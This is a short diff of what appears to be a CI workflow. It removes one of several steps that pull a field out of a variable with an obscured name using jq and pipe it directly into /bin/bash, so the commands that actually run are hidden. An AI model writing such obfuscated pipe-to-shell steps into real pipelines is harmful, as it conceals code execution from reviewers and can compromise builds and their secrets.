@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$yr1" | jq -r .kwg966 | /bin/bash
           echo $nuq9464 | jq -r .t9927 | /bin/bash
           printf '%s' "$oqmit0" | jq -r .tymwk381 | /bin/bash
-          printf '%s' "$hkjvr0080" | jq -r .gjw5543 | /bin/bash
           echo $mmp00346 | jq -r .y30 | /bin/bash
 
       - name: Upload artifact
